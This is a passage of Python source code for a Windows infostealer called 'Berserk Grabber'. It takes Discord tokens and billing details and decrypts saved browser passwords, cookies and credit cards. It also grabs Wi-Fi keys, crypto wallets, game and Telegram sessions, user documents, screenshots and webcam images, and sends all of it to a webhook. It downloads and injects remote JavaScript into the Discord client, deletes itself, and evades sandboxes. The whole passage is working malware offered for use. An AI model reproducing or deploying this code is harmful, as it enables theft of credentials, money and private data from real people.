                    r_pay = requests.get("https://discord.com/api/v6/users/@me/billing/payment-sources", headers=headers, timeout=REQUEST_TIMEOUT)
                    payment = r_pay.json() if r_pay.status_code == 200 else []
                except Exception:
                    payment = []

                username = user.get('username', '') + '#' + str(user.get('discriminator', '0'))
                global_name = user.get('global_name') or user.get('username') or ''
                discord_id = user.get('id', '')
                avatar_hash = user.get('avatar') or ''
                try:
                    gif_ok = avatar_hash and requests.get(f"https://cdn.discordapp.com/avatars/{discord_id}/{avatar_hash}.gif", timeout=REQUEST_TIMEOUT).status_code == 200
                except Exception:
                    gif_ok = False
                avatar_url = f"https://cdn.discordapp.com/avatars/{discord_id}/{avatar_hash}.gif" if gif_ok and avatar_hash else (f"https://cdn.discordapp.com/avatars/{discord_id}/{avatar_hash}.png" if avatar_hash else "https://cdn.discordapp.com/embed/avatars/0.png")
                phone = user.get('phone') or 'N/A'
                email = user.get('email') or 'N/A'

                mfa = "✅" if user.get('mfa_enabled') else "❌"
                premium_types = {0: "❌", 1: "Nitro Classic", 2: "Nitro", 3: "Nitro Basic"}
                nitro = premium_types.get(user.get('premium_type'), "❌")
                flags = user.get('flags', 0) or 0
                public_flags = user.get('public_flags', 0) or 0
                badge_bits = flags | public_flags
                badge_names = []
                if badge_bits & (1 << 0): badge_names.append("Discord Employee")
                if badge_bits & (1 << 1): badge_names.append("Partner")
                if badge_bits & (1 << 2): badge_names.append("HypeSquad")
                if badge_bits & (1 << 3): badge_names.append("Bug Hunter")
                if badge_bits & (1 << 6): badge_names.append("HypeSquad Bravery")
                if badge_bits & (1 << 7): badge_names.append("HypeSquad Brilliance")
                if badge_bits & (1 << 8): badge_names.append("HypeSquad Balance")
                if badge_bits & (1 << 9): badge_names.append("Early Supporter")
                if badge_bits & (1 << 14): badge_names.append("Verified Bot")
                if badge_bits & (1 << 17): badge_names.append("Active Developer")
                if badge_bits & (1 << 18): badge_names.append("Discord Certified Mod")
                badges_str = ", ".join(badge_names) if badge_names else "None"

                if not isinstance(payment, list) or payment == [] or "message" in payment:
                    methods = "❌"
                else:
                    methods = "".join(["💳" if method.get('type') == 1 else "<:paypal:973417655627288666>" if method.get('type') == 2 else "❓" for method in payment])

                val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}`\n**Display Name:** `{global_name}`\n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔐 **2FA:** {mfa}\n**Badges:** {badges_str}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'

                fields = [{"name": "Discord Info", "value": val}]
                try:
                    hq_friends = _get_hq_friends(token)
                    if hq_friends:
                        fields.append({"name": "HQ Friends", "value": _trim_embed_value(hq_friends), "inline": False})
                    hq_guilds = _get_hq_guilds(token)
                    if hq_guilds:
                        fields.append({"name": "HQ Guilds", "value": _trim_embed_value(hq_guilds), "inline": False})
                    gift_codes = _get_gift_codes(token)
                    if gift_codes:
                        fields.append({"name": "Gift Codes", "value": _trim_embed_value(gift_codes), "inline": False})
                except Exception:
                    pass

                data = {
                    "embeds": [
                        {
                            "title": f"{username}",
                            "color": 5639644,
                            "fields": fields,
                            "thumbnail": {"url": avatar_url},
                            "footer": {"text": "Berserk Grabber | Created By benzoXdev"},
                        }
                    ],
                    "username": "Berserk",
                    "avatar_url": "https://avatars.githubusercontent.com/u/210432555?v=4",
                }
                safe_post(webhook, json_data=data)
                self.tokens_sent.append(token)
            except Exception:
                continue

        try:
            self.robloxinfo(webhook)
        except Exception:
            pass

        try:
            image = ImageGrab.grab(bbox=None, all_screens=True, include_layered_windows=False, xdisplay=None)
            image.save(temp_path + "\\desktopshot.png")
            image.close()

            webhook_data = {
                "username": "Berserk",
                "avatar_url": "https://avatars.githubusercontent.com/u/210432555?v=4",
                "embeds": [{"color": 5639644, "title": "Desktop Screenshot", "image": {"url": "attachment://image.png"}}]
            }
            with open(temp_path + "\\desktopshot.png", "rb") as f:
                image_data = f.read()
                encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})

                try:
                    camera = cv2.VideoCapture(0)
                    return_value, image = camera.read()
                    if return_value and image is not None:
                        cv2.imwrite(temp_path + "\\webcamshot.png", image)
                        webcam_path = temp_path + "\\webcamshot.png"
                        if os.path.isfile(webcam_path):
                            with open(webcam_path, 'rb') as wf:
                                webcamshot = {'file': ('webcamshot.png', wf.read())}
                            safe_post(webhook, data={"username": "Berserk", "avatar_url": "https://avatars.githubusercontent.com/u/210432555?v=4"}, files=webcamshot)
                    camera.release()
                    cv2.destroyAllWindows()
                except Exception:
                    pass

            safe_post(webhook, data=encoder, headers={'Content-type': encoder.content_type})
        except Exception:
            pass


class Browsers:
    def __init__(self):
        self.appdata = os.getenv('LOCALAPPDATA')
        self.roaming = os.getenv('APPDATA')
        self.browser_exe = ["chrome.exe", "firefox.exe", "brave.exe", "opera.exe", "kometa.exe", "orbitum.exe", "centbrowser.exe",
                            "7star.exe", "sputnik.exe", "vivaldi.exe", "epicprivacybrowser.exe", "msedge.exe", "uran.exe", "yandex.exe", "iridium.exe"]
        self.browsers_found = []
        self.browsers = {
            'kometa': self.appdata + '\\Kometa\\User Data',
            'orbitum': self.appdata + '\\Orbitum\\User Data',
            'cent-browser': self.appdata + '\\CentBrowser\\User Data',
            '7star': self.appdata + '\\7Star\\7Star\\User Data',
            'sputnik': self.appdata + '\\Sputnik\\Sputnik\\User Data',
            'vivaldi': self.appdata + '\\Vivaldi\\User Data',
            'google-chrome-sxs': self.appdata + '\\Google\\Chrome SxS\\User Data',
            'google-chrome': self.appdata + '\\Google\\Chrome\\User Data',
            'epic-privacy-browser': self.appdata + '\\Epic Privacy Browser\\User Data',
            'microsoft-edge': self.appdata + '\\Microsoft\\Edge\\User Data',
            'uran': self.appdata + '\\uCozMedia\\Uran\\User Data',
            'yandex': self.appdata + '\\Yandex\\YandexBrowser\\User Data',
            'brave': self.appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
            'iridium': self.appdata + '\\Iridium\\User Data',
            'opera': self.roaming + '\\Opera Software\\Opera Stable',
            'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
        }

        self.profiles = [
            'Default',
            'Profile 1',
            'Profile 2',
            'Profile 3',
            'Profile 4',
            'Profile 5',
        ]

        for proc in psutil.process_iter(['name']):
            process_name = proc.info['name'].lower()
            if process_name in self.browser_exe:
                self.browsers_found.append(proc)

        for proc in self.browsers_found:
            try:
                proc.kill()
            except Exception:
                pass

        os.makedirs(os.path.join(temp_path, "Browser"), exist_ok=True)

        def process_browser(name, path, profile, func):
            try:
                func(name, path, profile)
            except Exception:
                pass

        threads = []
        for name, path in self.browsers.items():
            if not os.path.isdir(path):
                continue

            self.masterkey = self.get_master_key(path + '\\Local State')
            self.funcs = [
                self.cookies,
                self.history,
                self.downloads,
                self.passwords,
                self.credit_cards,
                self.bookmarks,
            ]
            if __CONFIG__.get("autofills"):
                self.funcs.append(self.autofills)

            for profile in self.profiles:
                for func in self.funcs:
                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
                    thread.start()
                    threads.append(thread)

        for thread in threads:
            thread.join()

        self.roblox_cookies()

    def get_master_key(self, path: str) -> str:
        try:
            with open(path, "r", encoding="utf-8") as f:
                c = f.read()
            local_state = json.loads(c)
            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
            master_key = master_key[5:]
            master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
            return master_key
        except Exception:
            pass

    def decrypt_password(self, buff: bytes, master_key: bytes) -> str:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(master_key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)
        decrypted_pass = decrypted_pass[:-16].decode()
        return decrypted_pass

    def passwords(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\Login Data'
        else:
            path += '\\' + profile + '\\Login Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
        password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
        for results in cursor.fetchall():
            if not results[0] or not results[1] or not results[2]:
                continue
            url = results[0]
            login = results[1]
            password = self.decrypt_password(results[2], self.masterkey)
            with open(password_file_path, "a", encoding="utf-8") as f:
                if os.path.getsize(password_file_path) == 0:
                    f.write("Website  |  Username  |  Password\n\n")
                f.write(f"{url}  |  {login}  |  {password}\n")
        cursor.close()
        conn.close()

    def cookies(self, name: str, path: str, profile: str):
        import os, sqlite3, shutil, binascii, csv

        if name in ('opera', 'opera-gx'):
            db_path = path if path.lower().endswith('cookies') else os.path.join(path, 'Network', 'Cookies')
        else:
            db_path = os.path.join(
                os.environ['LOCALAPPDATA'],
                r"Google\Chrome\User Data",
                profile, 
                "Network",
                "Cookies"
            )

        temp_db = os.path.join(os.environ['TEMP'], f"{name}_{profile}_cookies.db")
        shutil.copyfile(db_path, temp_db)
        for suf in ("-wal", "-shm"):
            src = db_path + suf
            dst = temp_db + suf
            if os.path.exists(src):
                try:
                    shutil.copyfile(src, dst)
                except Exception:
                    pass

        conn = sqlite3.connect(temp_db)
        conn.text_factory = bytes 
        cursor = conn.cursor()
        cursor.execute("SELECT host_key, name, path, encrypted_value, expires_utc FROM cookies")
        rows = cursor.fetchall()

        out_file = os.path.join(temp_path, "Browser", "cookies.txt")
        os.makedirs(os.path.dirname(out_file), exist_ok=True)
        with open(out_file, 'a', encoding="utf-8") as f:
            f.write(f"\nBrowser: {name}     Profile: {profile}\n\n")
            for host_key, cname, cpath, encrypted_value, expires_utc in rows:
                if isinstance(encrypted_value, (bytes, bytearray)):
                    encrypted_hex = binascii.hexlify(encrypted_value).decode("ascii")
                else:
                    encrypted_hex = str(encrypted_value)
                f.write(
                    f"{host_key}\t"
                    f"{cname}={encrypted_hex}\t"
                    f"Path={cpath}\t"
                    f"Expires={expires_utc}\n"
                )

        cursor.close()
        conn.close()
        for suf in ("", "-wal", "-shm"):
            try:
                os.remove(temp_db + suf)
            except FileNotFoundError:
                pass
            except PermissionError:
                pass

    def history(self, name: str, path: str, profile: str):
        if name == 'opera' or name == 'opera-gx':
            path += '\\History'
        else:
            path += '\\' + profile + '\\History'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        history_file_path = os.path.join(temp_path, "Browser", "history.txt")
        with open(history_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(history_file_path) == 0:
                f.write("Url  |  Visit Count\n\n")
            for res in cursor.execute("SELECT url, visit_count FROM urls").fetchall():
                url, visit_count = res
                f.write(f"{url}  |  {visit_count}\n")
        cursor.close()
        conn.close()

    def downloads(self, name: str, path: str, profile: str):
        """Extract browser download history (skstealer-style, Chromium downloads table)."""
        if name in ('opera', 'opera-gx'):
            db_path = os.path.join(path, 'History')
        else:
            db_path = os.path.join(path, profile, 'History')
        if not os.path.isfile(db_path) or os.path.getsize(db_path) == 0:
            return
        try:
            tmp = os.path.join(os.getenv("TEMP", ""), "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10)) + ".tmp")
            shutil.copy2(db_path, tmp)
            conn = sqlite3.connect(tmp)
            cursor = conn.cursor()
            cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='downloads'")
            if not cursor.fetchone():
                conn.close()
                os.remove(tmp)
                return
            out_path = os.path.join(temp_path, "Browser", "downloads.txt")
            with open(out_path, "a", encoding="utf-8") as f:
                if os.path.getsize(out_path) == 0:
                    f.write("Path  |  Url  |  Browser\n\n")
                for row in cursor.execute("SELECT tab_url, target_path FROM downloads").fetchall():
                    tab_url, target_path = (row[0] or ""), (row[1] or "")
                    if tab_url or target_path:
                        f.write(f"{target_path}  |  {tab_url}  |  {name}\n")
            conn.close()
            os.remove(tmp)
        except Exception:
            pass

    def credit_cards(self, name: str, path: str, profile: str):
        if name in ['opera', 'opera-gx']:
            path += '\\Web Data'
        else:
            path += '\\' + profile + '\\Web Data'
        if not os.path.isfile(path):
            return
        conn = sqlite3.connect(path)
        cursor = conn.cursor()
        cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
        with open(cc_file_path, 'a', encoding="utf-8") as f:
            if os.path.getsize(cc_file_path) == 0:
                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
            for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                name_on_card, expiration_month, expiration_year, card_number_encrypted = res
                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
        cursor.close()
        conn.close()

    def bookmarks(self, name: str, path: str, profile: str):
        """Extract browser bookmarks (Chrome/Edge/Brave JSON)."""
        if name in ('opera', 'opera-gx'):
            book_path = os.path.join(path, 'Bookmarks')
        else:
            book_path = os.path.join(path, profile, 'Bookmarks')
        if not os.path.isfile(book_path):
            return
        try:
            with open(book_path, "r", encoding="utf-8", errors="ignore") as f:
                data = json.load(f)
            out_path = os.path.join(temp_path, "Browser", "bookmarks.txt")
            lines = []

            def walk(node):
                if isinstance(node, dict):
                    if node.get("type") == "url" and node.get("url"):
                        lines.append(node.get("name", "") + " | " + node.get("url", ""))
                    for c in node.get("children", []):
                        walk(c)

            walk(data.get("roots", {}).get("bookmark_bar", {}))
            walk(data.get("roots", {}).get("other", {}))
            walk(data.get("roots", {}).get("synced", {}))
            if lines:
                with open(out_path, "a", encoding="utf-8") as f:
                    f.write("\n".join(lines) + "\n")
        except Exception:
            pass

    def autofills(self, name: str, path: str, profile: str):
        """Extract browser autofill data (Blank Grabber compatible)."""
        if name in ('opera', 'opera-gx'):
            db_path = os.path.join(path, 'Web Data')
        else:
            db_path = os.path.join(path, profile, 'Web Data')
        if not os.path.isfile(db_path):
            return
        try:
            tmp = os.path.join(os.getenv("TEMP", ""), "".join(random.choices("abcdefghijklmnopqrstuvwxyz", k=10)) + ".tmp")
            shutil.copy2(db_path, tmp)
            conn = sqlite3.connect(tmp)
            conn.text_factory = lambda b: b.decode(errors="ignore")
            cursor = conn.cursor()
            rows = cursor.execute("SELECT value FROM autofill").fetchall()
            conn.close()
            try:
                os.remove(tmp)
            except Exception:
                pass
            out_path = os.path.join(temp_path, "Browser", "autofills.txt")
            seen = set()
            with open(out_path, "a", encoding="utf-8") as f:
                for (val,) in rows:
                    if not val:
                        continue
                    s = val.strip()
                    if s and s not in seen:
                        seen.add(s)
                        f.write(s + "\n")
        except Exception:
            pass

    def roblox_cookies(self):
        robo_cookie_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")

        if not __CONFIG__["roblox"]:
            pass
        else:
            robo_cookie = ""
            with open(os.path.join(temp_path, "Browser", "cookies.txt"), 'r', encoding="utf-8") as g:
                with open(robo_cookie_file, 'w', encoding="utf-8") as f:
                    for line in g:
                        if ".ROBLOSECURITY" in line:
                            robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
                            f.write(robo_cookie + "\n\n")
                    if os.path.getsize(robo_cookie_file) == 0:
                        f.write("No Roblox Cookies Found")


class Wifi:
    def __init__(self):
        self.wifi_list = []
        self.name_pass = {}

        data = subprocess.getoutput('netsh wlan show profiles').split('\n')
        for line in data:
            if 'All User Profile' in line:
                self.wifi_list.append(line.split(":")[-1][1:])
                self.wifi_info()

    def wifi_info(self):
        for i in self.wifi_list:
            command = subprocess.getoutput(
                f'netsh wlan show profile "{i}" key=clear')
            if "Key Content" in command:
                split_key = command.split('Key Content')
                tmp = split_key[1].split('\n')[0]
                key = tmp.split(': ')[1]
                self.name_pass[i] = key
            else:
                key = ""
                self.name_pass[i] = key
        os.makedirs(os.path.join(temp_path, "Wifi"), exist_ok=True)
        with open(os.path.join(temp_path, "Wifi", "Wifi Passwords.txt"), 'w', encoding="utf-8") as f:
            for i, j in self.name_pass.items():
                f.write(f'Wifi Name : {i} | Password : {j}\n')
        f.close()


class CommonFiles:
    """Collect common user files from Desktop, Documents, etc. (stealcord/cstealer compatible)."""
    KEYWORDS = (
        "secret", "password", "account", "tax", "key", "wallet", "backup", "seed", "phrase", "recovery", "private",
        "2fa", "2FA", "backup code", "recovery code", "mnemonic", "memoric", "passphrase", "seedphrase", "login",
        "mdp", "metamask", "crypto", "token", "exodus", "paypal", "banque", "discord", "code", "memo", "compte",
        "bot", "atomic", "acount", "private key", "prv", "funds", "note", "identifiant", "personnel", "sauvegarde",
        "recup", "récup", "trading", "bitcoin", "steal", "bank", "info", "casino", "telegram", "pass", "importante",
        "senhas", "contas", "exposed", "work", "source", "users", "username", "user", "usuario", "log",
    )
    EXTENSIONS = (".txt", ".doc", ".docx", ".png", ".pdf", ".jpg", ".jpeg", ".csv", ".mp3", ".mp4", ".xls", ".xlsx")
    MAX_SIZE = 2 * 1024 * 1024  # 2 MB

    def __init__(self):
        base = os.path.join(temp_path, "Common Files")
        profile = os.getenv("userprofile") or os.path.expanduser("~")
        roaming = os.getenv("APPDATA") or ""
        dirs = [
            ("Desktop", os.path.join(profile, "Desktop")),
            ("Pictures", os.path.join(profile, "Pictures")),
            ("Documents", os.path.join(profile, "Documents")),
            ("Music", os.path.join(profile, "Music")),
            ("Videos", os.path.join(profile, "Videos")),
            ("Downloads", os.path.join(profile, "Downloads")),
            ("Recent", os.path.join(roaming, "Microsoft", "Windows", "Recent")),
            ("OneDrive", os.path.join(profile, "OneDrive")),
        ]
        for name, dir_path in dirs:
            if not os.path.isdir(dir_path):
                continue
            try:
                for fn in os.listdir(dir_path):
                    full = os.path.join(dir_path, fn)
                    if not os.path.isfile(full):
                        continue
                    if os.path.getsize(full) >= self.MAX_SIZE:
                        continue
                    lower = fn.lower()
                    if any(k in lower for k in self.KEYWORDS) or any(lower.endswith(ext) for ext in self.EXTENSIONS):
                        dest_dir = os.path.join(base, name)
                        os.makedirs(dest_dir, exist_ok=True)
                        try:
                            shutil.copy2(full, os.path.join(dest_dir, fn))
                        except Exception:
                            pass
            except Exception:
                pass


def _get_lnk_target(lnk_path: str):
    """Return target path of a .lnk file or None."""
    try:
        out = subprocess.run(
            'wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(lnk_path).replace("\\", "\\\\"),
            shell=True, capture_output=True, timeout=5)
        text = (out.stdout or b"").decode(errors="ignore")
        for line in text.splitlines():
            if line.strip().startswith("Target="):
                t = line.split("=", 1)[1].strip()
                if t and os.path.exists(t):
                    return t
    except Exception:
        pass
    return None


def _find_startmenu_lnks(app_name: str):
    """Return list of paths to .lnk files matching app_name in Start Menu."""
    found = []
    for base in [
        os.path.join(os.getenv("APPDATA", ""), "Microsoft", "Windows", "Start Menu", "Programs"),
        os.path.join(os.getenv("ProgramData", ""), "Microsoft", "Windows", "Start Menu", "Programs"),
    ]:
        if not os.path.isdir(base):
            continue
        try:
            for root, _, files in os.walk(base):
                for f in files:
                    if f.lower() == app_name.lower() + ".lnk":
                        found.append(os.path.join(root, f))
        except Exception:
            pass
    return found


class GrowtopiaSession:
    """Steal Growtopia save.dat (Blank Grabber compatible)."""
    def __init__(self):
        save_to = os.path.join(temp_path, "Games", "Growtopia")
        lnks = _find_startmenu_lnks("Growtopia")
        dirs = []
        for lnk in lnks:
            t = _get_lnk_target(lnk)
            if t:
                d = os.path.dirname(t)
                if d and d not in dirs:
                    dirs.append(d)
        multiple = len(dirs) > 1
        for i, dir_path in enumerate(dirs):
            save_dat = os.path.join(dir_path, "save.dat")
            if not os.path.isfile(save_dat):
                continue
            try:
                dest = os.path.join(save_to, "Profile %d" % (i + 1)) if multiple else save_to
                os.makedirs(dest, exist_ok=True)
                shutil.copy2(save_dat, os.path.join(dest, "save.dat"))
            except Exception:
                pass


class SessionFiles:
    """Collect crypto wallets, game launchers and app data (BuilderOptions/xlabbgrabber compatible paths)."""
    def __init__(self):
        roaming = os.getenv("APPDATA") or ""
        local = os.getenv("LOCALAPPDATA") or ""
        pf86 = os.getenv("ProgramFiles(x86)") or os.getenv("ProgramFiles") or ""
        self.session_files = [
            ("Zcash",             os.path.join(roaming, "Zcash"),                                                      "zcash.exe",             "Wallets"),
            ("Armory",            os.path.join(roaming, "Armory"),                                                     "armory.exe",            "Wallets"),
            ("Bytecoin",          os.path.join(roaming, "bytecoin"),                                                   "bytecoin.exe",          "Wallets"),
            ("Guarda",            os.path.join(roaming, "Guarda", "Local Storage", "leveldb"),                         "guarda.exe",            "Wallets"),
            ("Atomic Wallet",     os.path.join(roaming, "atomic", "Local Storage", "leveldb"),                         "atomic.exe",            "Wallets"),
            ("Exodus",            os.path.join(roaming, "Exodus", "exodus.wallet"),                                    "exodus.exe",            "Wallets"),
            ("Binance",           os.path.join(roaming, "Binance", "Local Storage", "leveldb"),                        "binance.exe",           "Wallets"),
            ("Jaxx Liberty",      os.path.join(roaming, "com.liberty.jaxx", "IndexedDB", "file__0.indexeddb.leveldb"), "jaxx.exe",              "Wallets"),
            ("Electrum",          os.path.join(roaming, "Electrum", "wallets"),                                        "electrum.exe",          "Wallets"),
            ("Coinomi",           os.path.join(roaming, "Coinomi", "Coinomi", "wallets"),                              "coinomi.exe",           "Wallets"),
            ("Trust Wallet",      os.path.join(roaming, "Trust Wallet"),                                               "trustwallet.exe",       "Wallets"),
            ("AtomicDEX",         os.path.join(roaming, "AtomicDEX"),                                                  "atomicdex.exe",         "Wallets"),
            ("Wasabi Wallet",     os.path.join(roaming, "WalletWasabi", "Wallets"),                                    "wasabi.exe",            "Wallets"),
            ("Ledger Live",       os.path.join(roaming, "Ledger Live"),                                                "ledgerlive.exe",        "Wallets"),
            ("Trezor Suite",      os.path.join(roaming, "Trezor", "suite"),                                            "trezor.exe",            "Wallets"),
            ("Blockchain Wallet", os.path.join(roaming, "Blockchain", "Wallet"),                                       "blockchain.exe",        "Wallets"),
            ("Mycelium",          os.path.join(roaming, "Mycelium", "Wallets"),                                        "mycelium.exe",          "Wallets"),
            ("Crypto.com",        os.path.join(roaming, "Crypto.com", "appdata"),                                      "crypto.com.exe",        "Wallets"),
            ("BRD",               os.path.join(roaming, "BRD", "wallets"),                                             "brd.exe",               "Wallets"),
            ("Coinbase Wallet",   os.path.join(roaming, "Coinbase", "Wallet"),                                         "coinbase.exe",          "Wallets"),
            ("Zerion",            os.path.join(roaming, "Zerion", "wallets"),                                          "zerion.exe",            "Wallets"),
            ("Steam",             os.path.join(pf86, "Steam", "config"),                                              "steam.exe",             "Game Launchers"),
            ("Riot Games",        os.path.join(local, "Riot Games", "Riot Client", "Data"),                            "riot.exe",              "Game Launchers"),
            ("Epic Games",        os.path.join(local, "EpicGamesLauncher"),                                            "epicgameslauncher.exe", "Game Launchers"),
            ("Rockstar Games",    os.path.join(local, "Rockstar Games"),                                               "rockstarlauncher.exe",  "Game Launchers"),
            ("Uplay",             os.path.join(local, "Ubisoft Game Launcher"),                                        "upc.exe",               "Game Launchers"),
            ("Telegram",          os.path.join(roaming, "Telegram Desktop", "tdata"),                                  "telegram.exe",          "Apps"),
        ]
        base_dir = os.path.join(temp_path, "Session Files")
        os.makedirs(base_dir, exist_ok=True)
        for name, path, _proc, _typ in self.session_files:
            if not path or not os.path.exists(path):
                continue
            try:
                dest_dir = os.path.join(base_dir, name)
                os.makedirs(dest_dir, exist_ok=True)
                with open(os.path.join(dest_dir, "path.txt"), "w", encoding="utf-8") as f:
                    f.write(path)
                if os.path.isdir(path):
                    for root, _, files in os.walk(path):
                        for fn in files:
                            abs_path = os.path.join(root, fn)
                            rel = os.path.relpath(abs_path, path)
                            dest_path = os.path.join(dest_dir, "Files", rel)
                            try:
                                os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                                shutil.copy2(abs_path, dest_path)
                            except Exception:
                                pass
                else:
                    try:
                        os.makedirs(os.path.join(dest_dir, "Files"), exist_ok=True)
                        shutil.copy2(path, os.path.join(dest_dir, "Files", os.path.basename(path)))
                    except Exception:
                        pass
            except Exception:
                pass


class Minecraft:
    def __init__(self):
        self.roaming = os.getenv("appdata")
        self.accounts_path = "\\.minecraft\\launcher_accounts.json"
        self.usercache_path = "\\.minecraft\\usercache.json"

        if os.path.exists(os.path.join(self.roaming, ".minecraft")):
            os.makedirs(os.path.join(temp_path, "Minecraft"), exist_ok=True)
            try:
                self.session_info()
                self.user_cache()
            except Exception as e:
                print(e)

    def session_info(self):
        with open(os.path.join(temp_path, "Minecraft", "Session Info.txt"), 'w', encoding="cp437") as f:
            with open(self.roaming + self.accounts_path, "r") as g:
                self.session = json.load(g)
                f.write(json.dumps(self.session, indent=4))
        f.close()

    def user_cache(self):
        with open(os.path.join(temp_path, "Minecraft", "User Cache.txt"), 'w', encoding="cp437") as f:
            with open(self.roaming + self.usercache_path, "r") as g:
                self.user = json.load(g)
                f.write(json.dumps(self.user, indent=4))
        f.close()


class BackupCodes:
    def __init__(self):
        self.path = os.environ["HOMEPATH"]
        self.code_path = '\\Downloads\\discord_backup_codes.txt'
        self.get_codes()

    def get_codes(self):
        if os.path.exists(self.path + self.code_path):
            os.makedirs(os.path.join(temp_path, "Discord"), exist_ok=True)
            with open(os.path.join(temp_path, "Discord", "2FA Backup Codes.txt"), "w", encoding="utf-8", errors='ignore') as f:
                with open(self.path + self.code_path, 'r') as g:
                    for line in g.readlines():
                        if line.startswith("*"):
                            f.write(line)
            f.close()


class AntiSpam:
    def __init__(self):
        if self.check_time():
            sys.exit(0)

    def check_time(self) -> bool:
        current_time = time.time()
        try:
            with open(f"{temp}\\dd_setup.txt", "r") as f:
                code = f.read()
                if code != "":
                    old_time = float(code)
                    if current_time - old_time > 60:
                        with open(f"{temp}\\dd_setup.txt", "w") as f:
                            f.write(str(current_time))
                        return False
                    else:
                        return True
        except FileNotFoundError:
            with open(f"{temp}\\dd_setup.txt", "w") as g:
                g.write(str(current_time))
            return False


class SelfDestruct():
    def __init__(self):
        self.path, self.frozen = self.getfile()
        self.delete()

    def getfile(self):
        if hasattr(sys, 'frozen'):
            return (sys.executable, True)
        else:
            return (__file__, False)

    def delete(self):
        if self.frozen:
            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
            os._exit(0)
        else:
            os.remove(self.path)


class Injection:
    def __init__(self, webhook: str) -> None:
        self.appdata = os.getenv('LOCALAPPDATA')
        self.discord_dirs = [
            self.appdata + '\\Discord',
            self.appdata + '\\DiscordCanary',
            self.appdata + '\\DiscordPTB',
            self.appdata + '\\DiscordDevelopment'
        ]
        self.code = requests.get('https://raw.githubusercontent.com/Mimar5513R/discord-injection/refs/heads/main/injection.js', timeout=REQUEST_TIMEOUT).text

        for proc in psutil.process_iter():
            if 'discord' in proc.name().lower():
                proc.kill()

        for dir in self.discord_dirs:
            if not os.path.exists(dir):
                continue

            if self.get_core(dir) is not None:
                with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                    self.start_discord(dir)

    def get_core(self, dir: str) -> tuple:
        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                modules = dir + '\\' + file + '\\modules'
                if not os.path.exists(modules):
                    continue
                for file in os.listdir(modules):
                    if re.search(r'discord_desktop_core-+?', file):
                        core = modules + '\\' + file + '\\' + 'discord_desktop_core'
                        if not os.path.exists(core + '\\index.js'):
                            continue
                        return core, file

    def start_discord(self, dir: str) -> None:
        update = dir + '\\Update.exe'
        executable = dir.split('\\')[-1] + '.exe'

        for file in os.listdir(dir):
            if re.search(r'app-+?', file):
                app = dir + '\\' + file
                if os.path.exists(app + '\\' + 'modules'):
                    for file in os.listdir(app):
                        if file == executable:
                            executable = app + '\\' + executable
                            subprocess.call([update, '--processStart', executable],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)


class Debug:
    def __init__(self):
        if self.checks():
            self.self_destruct()

    def checks(self):
        debugging = False

        self.blackListedUsers = [
            'WDAGUtilityAccount', 'Abby', 'hmarc', 'patex', 'RDhJ0CNFevzX', 'kEecfMwgj', 'Frank', '8Nl0ColNQ5bq', 'Lisa', 'John', 'george', 'PxmdUOpVyx', '8VizSM', 'w0fjuOVmCcP5A',
            'lmVwjj9b', 'PqONjHVwexsS', '3u2v9m8', 'Julia', 'HEUeRzl', 'fred', 'server', 'BvJChRPnsxn', 'Harry Johnson', 'SqgFOf3G', 'Lucas', 'mike', 'PateX', 'h7dk1xPr', 'Louise',
            'User01', 'test', 'RGzcBUyrznReg', 'Admin', 'OgJb6GqgK0O']
        self.blackListedPCNames = [
            'BEE7370C-8C0C-4', 'DESKTOP-NAKFFMT', 'WIN-5E07COS9ALR', 'B30F0242-1C6A-4', 'DESKTOP-VRSQLAG', 'Q9IATRKPRH', 'XC64ZB', 'DESKTOP-D019GDM', 'DESKTOP-WI8CLET', 'SERVER1',
            'LISA-PC', 'JOHN-PC', 'DESKTOP-B0T93D6', 'DESKTOP-1PYKP29', 'DESKTOP-1Y2433R', 'WILEYPC', 'WORK', '6C4E733F-C2D9-4', 'RALPHS-PC', 'DESKTOP-WG3MYJS', 'DESKTOP-7XC6GEZ',
            'DESKTOP-5OV9S0O', 'QarZhrdBpj', 'ORELEEPC', 'ARCHIBALDPC', 'JULIA-PC', 'd1bnJkfVlH', 'NETTYPC', 'DESKTOP-BUGIO', 'DESKTOP-CBGPFEE', 'SERVER-PC', 'TIQIYLA9TW5M',
